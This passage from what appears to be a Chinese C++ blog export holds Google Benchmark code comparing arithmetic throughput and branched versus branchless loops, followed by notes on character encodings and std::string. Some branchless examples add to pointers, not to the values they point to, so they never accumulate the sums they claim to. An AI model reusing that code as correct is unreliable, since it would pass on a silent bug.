会在缓冲区进行推测执行，但是 CPU 会假装从未发生。 循环展开也许会对现代编译器下的代码产生有益的影响，但是不是一定的。因为许多向量化编译器，会使用 SSE 或者 AVX 指令来优化循环的执行，一次处理多个元素。所以，手动循环展开，不一定会更高效。 测试运算指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include \"benchmark/benchmark.h\"void BM_add(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; &#125; // 不让编译器对 state 次相同的操作，进行优化 // 但是内层循环的运算操作的优化，仍然生效 benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); // 强制写出结果到内存，高效的 内存屏障 benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_multiply(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += p1[i] * p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_divide(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand() + 1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += p1[i] / p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;unsigned long&gt; v3(N), v4(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); v3[i] = rand(); v4[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); unsigned long* p3 = v3.data(); unsigned long* p4 = v4.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p3[i] * p4[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add2_multiply_sub_shift(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_instructions1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; unsigned long a5 = 0, a6 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; a5 += p2[i] &lt;&lt; 1; a6 += (p2[i] - 3); &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::DoNotOptimize(a5); benchmark::DoNotOptimize(a6); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_instructions2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; unsigned long a5 = 0, a6 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; a5 += (p2[i] &lt;&lt; 1)*p2[i]; a6 += (p2[i] - 3)*p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::DoNotOptimize(a5); benchmark::DoNotOptimize(a6); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add2_multiply_sub_shift4(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;unsigned long&gt; v3(N), v4(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); v3[i] = rand(); v4[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); unsigned long* p3 = v3.data(); unsigned long* p4 = v4.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p2[i] * p3[i]; a3 += p4[i] &lt;&lt; 2; a4 += p3[i] - p4[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_max(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += (p1[i] &gt; p2[i]) ? p1[i] : p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply_dep(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += (p1[i] + p2[i]) * (p1[i] - p2[i]); //a1 += (p1[i] * p2[i]); &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;#define ARGS \\ -&gt;Arg(1&lt;&lt;22)BENCHMARK(BM_add) ARGS;BENCHMARK(BM_multiply) ARGS;BENCHMARK(BM_divide) ARGS;BENCHMARK(BM_add_multiply) ARGS;BENCHMARK(BM_add_multiply2) ARGS;BENCHMARK(BM_add2_multiply_sub_shift) ARGS;BENCHMARK(BM_instructions1) ARGS;BENCHMARK(BM_instructions2) ARGS;BENCHMARK(BM_add2_multiply_sub_shift4) ARGS;BENCHMARK(BM_max) ARGS;BENCHMARK(BM_add_multiply_dep) ARGS;BENCHMARK_MAIN(); 无分支计算 无分支计算可以消除或者减轻分支预测失败带来的性能损失。 但是，如果消除分支的代价是，增加了非内联的复杂函数的调用次数，那么函数调用的代价会比分支预测失败的代价大。 因为函数调用本身就会中断流水线，这也是内联函数高效地一个原因之一。 123// 编译命令clang++ -g -O3 -mavx2 -Wall -pedantic -I$GBEN_INC -lpthread -lrt -lm 02_branch.C $GBEN_LIB/libbenchmark.a -o benchmark 1234567#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;#define MCA_START __asm volatile(\"# LLVM-MCA-BEGIN\");#define MCA_END __asm volatile(\"# LLVM-MCA-END\");#include \"benchmark/benchmark.h\" 例一 1234567891011121314151617181920212223242526272829303132void BM_branched(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123;#if 0 (b1[i] ? a1 : a2) += p1[i];#else if (b1[i]) &#123; a1 += p1[i]; &#125; else &#123; a2 += p1[i]; &#125;#endif // 1 &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; 使用数组，消除分支，通过索引在不同的内存单元进行计算。 12345678910111213141516171819202122232425void BM_branchless(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long* a[2] = &#123; &amp;a2, &amp;a1 &#125;; for (size_t i = 0; i &lt; N; ++i) &#123; a[b1[i]] += p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; (b1[i] ? a1 : a2) 在某些编译器中，会使用查找数组的方式优化，也就是上面的方式。所以，比使用条件分支代码更高效。 例二 1234567891011121314151617181920212223242526272829void BM_branched1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i]; &#125; else &#123; a2 += p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; 使用两个中间值数组，进行分支消除。 12345678910111213141516171819202122232425262728void BM_branchless1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s1[2] = &#123; 0, p1[i] &#125;; unsigned long s2[2] = &#123; p2[i], 0 &#125;; a1 += s1[b1[i]]; a2 += s2[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; 例三 基于随机值条件分支的版本，处理器不能对其进行高效正确率高的分支预测。 1234567891011121314151617181920212223242526272829void BM_branched2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i] - p2[i]; &#125; else &#123; a2 += p1[i] * p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; 基于bool值条件分支的版本，处理器可以进行高效正确率高的分支预测，程序会被处理器优化执行，实测性能与无分支版本相当，甚至更好。 1234567891011121314151617181920212223242526272829void BM_branched2_predicted(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &gt; 0; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i] - p2[i]; &#125; else &#123; a2 += p1[i] * p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; 无分支版本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556void BM_branchless2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s1[2] = &#123; 0, p1[i] - p2[i] &#125;; unsigned long s2[2] = &#123; p1[i] * p2[i], 0 &#125;; a1 += s1[b1[i]]; a2 += s2[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_branchless2a(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long* a[2] = &#123; &amp;a2, &amp;a1 &#125;; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s[2] = &#123; p1[i] * p2[i], p1[i] - p2[i] &#125;; a[b1[i]] += s[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Optimize","slug":"Optimize","permalink":"https://racleray.github.io/tags/Optimize/"}],"author":"HeRui"},{"title":"C++ String","slug":"C-String","date":"2022-11-12T15:20:11.000Z","updated":"2024-01-09T10:19:17.591Z","comments":true,"path":"posts/d5d2990b.html","link":"","permalink":"https://racleray.github.io/posts/d5d2990b.html","excerpt":"C++ string 笔记","text":"计算机中的字符 ACSII码 起初，计算机使用ACSII码表示不同的英文字母以及符号。例如 32 代表空格，48 代表 ‘0’，65 代表 ‘A’，97 代表 ‘a’。 32~126 这些整数就用于是表示这些可显示字符(printable character)的。 0~31 和 127 这些整数，规定了一类特殊的控制字符(control character)： 0 表示空字符（‘\\0’） 9 表示 Tab 制表符（‘） 10 表示换行（‘’） 13 表示回车（‘） 27 表示 ESC 键（‘1b’） 127 表示 DEL 键（‘7f’）等 一些控制符号的使用，比较常见，如：Ctrl+C 来发送中断信号（SIGINT）强制终止程序；Ctrl+D 来关闭标准输入流，终止正在读取他的程序；Ctrl+I 的效果和 Tab 键一样， Ctrl+J 的效果和 Enter 键一样，Ctrl+H 的效果和退格键一样... 具体可以上wiki上查看。 UTF ASCII 码表，建立了英文字母和标点符号到 0x00~0x7F 的一一映射。那么，中文、拉丁文字、俄文等等呢？ 所以，各国开始推出自己用的编码格式规范。中国大陆推出了 GBK 编码格式表示简体中文的字符，同时简体和繁体的 GB18030 编码，包含了 27484 个汉字；日本推出了 Shift-JIS 编码格式表示日语的字符，等等。 再后来，就有了“万国码”的 Unicode。他给世界上所有的字符编码。全部字符都可以用一个 0x000000~0x10FFFF 的整数表示，也就是3个字节。 UTF-32 UTF-32 使用 wchar_t 这个 4 字节的数据类型，来表示 Unicode 编码，完全够用。 wchar_t 的问题在于，最高位字节是 0，导致 C 语言使用 \\0 判断字符串结束符的方式不再适用。 C 语言为了适应这个变化，推出了专门针对 wchar_t 的 wcslen、wcscpy、wmemset 等函数。Windows 也推出 LoadLibraryA 和 LoadLibraryW 两个版本，分别适配 char 和 wchar_t。 显然，所有字符都占用4字节，是浪费的。即使是中文汉字，本来也只需要 2 字节就能表示了（27484 个汉字，在 65536 的范围内）。 UTF-16 Windows 采用了 UTF-16 编码格式，这种规范下的 wchar_t 是 2 字节的（实际上就是 unsigned short 的类型别名）。超过2字节的字符被分成两个 wchar_t表示，拆法很复杂。 Windows 为了更好地伺候中国客户，还专门把中文 Windows 系统的默认编码格式改成了 GBK，大大妨碍了程序员编程和国际交流的便利性。 UTF-8 UTF-16 没法兼容 ASCII，在网络上传输还需要考虑字节序等等各种问题。 UTF-8 则是在 1、2、3、4 字节之间变长的编码。 作为变长编码的代价，UTF-8 需要在二进制中浪费额外的空间来表示当前编码的长度。但是 1 个字节的ASCII码还是能使用一个字节表示。使用二进制位的标记方式，进行变长编码。 而此时，C 语言也可以使用 \\0 判断字符串结束符了。节省了一些空间，也解决了C语言适配的问题。 解码编码格式对应 读写双方编码格式不同，会导致乱码。 所以 MSVC 编译器调试时，“烫烫烫”的问题，也可以解释了。 Windows 的 MSVC 在 Debug 模式下会默认把未初始化的栈内存填满 0xCC（x86 的 INT3 单步中断指令），未初始化的堆内存填满 0xCD。 而 0xCCCC 在 GBK 编码中就是“烫”，所以如果打印了栈上未初始化的字符串数组，就会看到“烫烫烫”。而 0xCDCD 在 GBK 编码中就是“屯”，所以如果打印了堆上未初始化的字符串数组，就会看到“屯屯屯”。 虽然现在普遍采用了 UTF-8 格式，但是中文版 Windows 还在用 UTF-16 和 GBK。Linux 也可根据环境变量 LANG 和 LC_ALL 的值来动态决定采用哪种编码格式和语言。 C++ 中对各大编码格式的支持如下表： 字符类型 字符串类型 字符串常量语法 大小（字节） 编码格式 char string \"字符\" 1 随系统默认编码格式而变 wchar_t（Linux） wstring L\"字符\" 4 UTF-32 wchar_t（Windows） wstring L\"字符\" 2 UTF-16 char8_t（C++20） u8string u8\"字符\" 1 UTF-8 char16_t（C++11） u16string u\"字符\" 2 UTF-16 char32_t（C++11） u32string U\"字符\" 4 UTF-32 后面三个是不随系统而改变的（C++ 标准委员会定义）。 C 语言字符串 char 在C语言中，char类型就是整数，只不过被表示成对应的字符表示。是数字就可以比较大小等。 常用的帮手函数如下： isupper(c) 判断是否为大写字母（‘A’ &lt;= c &amp;&amp; c &lt;= ‘Z’）。 islower(c) 判断是否为小写字母（‘a’ &lt;= c &amp;&amp; c &lt;= ‘z’）。 isalpha(c) 判断是否为字母（包括大写和小写）。 isdigit(c) 判断是否为数字（‘0’ &lt;= c &amp;&amp; c &lt;= ‘9’）。 isalnum(c) 判断是否为字母或数字（包括字母和数字）。 isxdigit(c) 判断是否为十六进制数字（0~9 或 a-f 或 A-F）。 isspace(c) 判断是否为等价于空格的字符（‘ ’ 或 ‘ 或 ‘’ 或 ‘ 或 ‘）。 iscntrl(c) 判断是否为控制字符（0 &lt;= c &amp;&amp; c &lt;= 31 或 c == 127）。 toupper(c) 把小写字母转换为大写字母，如果不是则原封不动返回。 tolower(c) 把大写字母转换为小写字母，如果不是则原封不动返回。 char 类型只需是 8 位即可，可以是有符号也可以是无符号，任凭编译器决定。在 x86 架构是有符号的 (char = signed char)，而在 arm 架构上则认为是无符号的 (char = unsigned char)。 但是C 语言却规定 short，int，long，long long 必须是有符号的 (int = signed int)，反而却没有规定他们的位宽，和 char 刚好相反。 C++ 标准保证 char，signed char，unsigned char 是三个完全不同的类型，std::is_same_v 分别判断他们总会得到 false，无论 x86 还是 arm。 123456789// 判断系统int main(int argc, char *argv[]) &#123; if (std::is_signed&lt;char&gt;::value) &#123; printf(\"signed, x86\"); &#125; else &#123; printf(\"unsigned, arm:\"); &#125; return 0;&#125; C string 字符串(string)就是由字符(character)组成的数组。 123char c = ‘h’; // ‘h’ 是个语法糖，等价于 104 ASCII码// “hello” 也是个语法糖，等价于数组 &#123;‘h’, ‘e’, ‘l’, ‘l’, ‘o’, 0&#125;char s[] = “hello”; C 语言的字符串因为只保留数组的首地址指针（指向第一个字符的指针），在以 char * 类型传递给其他函数时，其数组的长度无法知晓。 为了确切知道数组在什么地方结束，规定用 ASCII 码中的“空字符”也就是 0 来表示数组的结尾。这样只需要一个首地址指针就能表示一个动态长度的数组。 除了 \\0 ，其他常见转义符号： ‘’ 换行符：另起一行（光标移到下一行行首） ‘ 回车符：光标移到行首（覆盖原来的字符） ‘ 缩进符：光标横坐标对齐到 8 的整数倍 ‘ 退格符：光标左移，删除上个字符 ‘\\’ 反斜杠：表示这个是真的 ，不是转义符 ‘”’ 双引号：在字符串常量中使用，防止歧义 ‘’’ 单引号：在字符常量中使用，防止歧义 ‘\\0’ 空字符：标记字符串结尾，等价于 0，注意和 '0' 不等价。 C++ 字符串 使用C++的特性，简化对字符串数据的处理方式。其特点有： string 可以从 const char * 隐式构造：string s = “hello”; string 具有 +、+=、== 等直观的运算符重载：string(“hello”) + string(“world”) == string(“helloworld”) string 符合 vector 的接口，例如 begin/end/size/resize…… string 有一系列成员函数，例如 find/replace/substr…… string 可以通过 s.c_str() 重新转换回古板的 const char *。 string 在离开作用域时自动释放内存 (RAII)，不用手动 free。 C 语言字符串是单独一个 char *ptr，自动以 ‘\\0’ 结尾。C++ 字符串是 string 类，其成员有两个： char *ptr; size_t len; 有了len，就不需要 ‘\\0’ 标记结尾。 string 类从 C 字符串构造时，可以额外指定一个长度，string(“hello”, 3) 会得到 “hel”。len 超出范围会出现越界读取内存的错误。 c_str() 和 data() s.c_str() 保证返回的是以 0 结尾的字符串首地址指针，总长度为 s.size() + 1。 s.data() 只保证返回长度为 s.size() 的连续内存的首地址指针，不保证 0 结尾。 把 C++ 的 string 作为参数传入像 printf 这种 C 语言函数时，需要用 s.c_str()。如果只是在 C++ 函数之间传参数，直接用 string 或 string const &amp; 即可。考虑传参效率，可以使用 string_view。 1234void legacy_c(const char *name); // 古老的 C 语言遗产void modern_cpp(std::string name); // 这个函数是现代 C++void performance_geek(std::string const &amp;name); // 追求性能void performance_nerd(std::string_view name); // 超级追求性能 自定义字面量后缀 123456789string operator\"\"_s(const char *s, size_t len) &#123; return string(s, len);&#125;int main() &#123; // 使用 string s3 = \"hello\"_s + \"world\"_s; cout &lt;&lt; s3 &lt;&lt; endl;&#125; 写 “hello”_s 就相当于写 operator“”_s(“hello”, 5)，就相当于 string(“hello”, 5) 了。 如果你 using namespace std; 那么标准库已经自动帮你定义好了 “”s 后缀。这里 “hello”s 就等价于原本繁琐的 string(“hello”) 了。或者更安全一点 using namespace std::literials; std::to_string() std::to_string 是标准库定义的全局函数，他具有9个重载，将数字转为字符串。 把 to_string 作为全局函数，而不是 string 类的构造函数，可以让数字转字符串这个特定的需求，和字符串本身的实现不会有太多耦合。 相关函数，字符串转数字：std::stoi/stof/stod 是标准库定义的一系列全局函数。 stoi 有第二参数 &amp;pos，用来保存数字部分结束的那个字符在原字符串中所在的index。 stoi 的第三参数 base 表示，当前字符串表示的数字的进制。 另外 stof 支持科学计数法。 stringstream 想要完整字符串格式化功能（指定多少进制，左右对齐等），可以用专业的做法： C 语言的 sprintf C++ 的 stringstream C++20 新增的 std::format stringstream 是相对较早的处理方法，比如设置数字进制： 1234567891011#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt;int main() &#123; stringstream ss; ss &lt;&lt; hex &lt;&lt; 66; string s = ss.str(); std::cout &lt;&lt; s &lt;&lt; std::endl; // 只是为了显示结果&#125; 官方推荐用 stringstream 取代 to_string。stringstream 也可以取代 stoi。 123456789101112131415#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt;int main() &#123; string s = \"233word\"; stringstream ss(s); int num; ss &gt;&gt; num; string unit; ss &gt;&gt; unit; std::cout &lt;&lt; num &lt;&lt; \" \" &lt;&lt; unit &lt;&lt; std::endl;&#125; at() s.at(i) 和 s[i] 都可以获取字符串中的第 i 个字符。区别在于 at 如果遇到 i 越界的情况，也就是检测到 i ≥ s.size() 时，会抛出 std::out_of_range 异常终止程序。at 做越界检测需要额外的开销，[] 不需要。 其他方法 s.length() 和 s.size() 获取字符串长度有两种写法 s.length() 和 s.size() 等价。 substr() 函数原型为： 1string substr(size_t pos = 0, size_t len = -1) const; substr(pos, len) 会截取从第 pos 个字符开始，长度为 len 的子字符串，原字符串不会改变。 如果 pos 超出了原字符串的范围，则抛出 std::out_of_range 异常。 可以指定 len 为 -1（即 string::npos），此时会截取从 